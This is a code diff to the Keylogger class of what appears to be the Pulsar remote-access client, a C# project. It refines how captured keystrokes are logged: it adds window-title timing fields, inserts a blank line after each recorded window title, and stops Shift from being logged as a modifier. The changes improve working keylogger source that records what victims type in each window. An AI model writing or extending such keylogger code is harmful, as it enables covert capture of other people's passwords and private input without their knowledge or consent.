@@ -31,6 +31,10 @@ namespace Pulsar.Client.Logging
 
         public bool IsDisposed { get; private set; }
 
+        private string _rawWindowTitle = "";
+        private DateTime _rawWindowTitleLastChange = DateTime.UtcNow;
+        private readonly TimeSpan _titleStabilizeTime = TimeSpan.FromMilliseconds(350);
+
         public Keylogger(double flushInterval, long maxLogFileSize)
         {
             _maxLogFileSize = maxLogFileSize;
@@ -80,6 +84,7 @@ namespace Pulsar.Client.Logging
                     _currentWindow = win;
                     _lastWindowChange = DateTime.UtcNow;
                     _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] {win}");
+                    _lineBuffer.AppendLine();  // <-- NEW forced blank line
                 }
 
                 // Only process special keys in KeyDown, skip printable characters
@@ -231,9 +236,21 @@ namespace Pulsar.Client.Logging
             if (_heldModifiers.Count == 0)
                 return "";
 
+            // 🔥 NEW: Ignore Shift completely for printable characters
+            if (_heldModifiers.Count == 1 &&
+                (_heldModifiers.Contains(Keys.LShiftKey) || _heldModifiers.Contains(Keys.RShiftKey) ||
+                 _heldModifiers.Contains(Keys.ShiftKey)))
+            {
+                return "";
+            }
+
             StringBuilder sb = new StringBuilder();
             foreach (var m in _heldModifiers)
             {
+                // Skip Shift — it’s not a meaningful modifier for logging unless combined with others
+                if (m == Keys.LShiftKey || m == Keys.RShiftKey || m == Keys.ShiftKey)
+                    continue;
+
                 string modName = m.ToString()
                     .Replace("L", "")
                     .Replace("R", "")
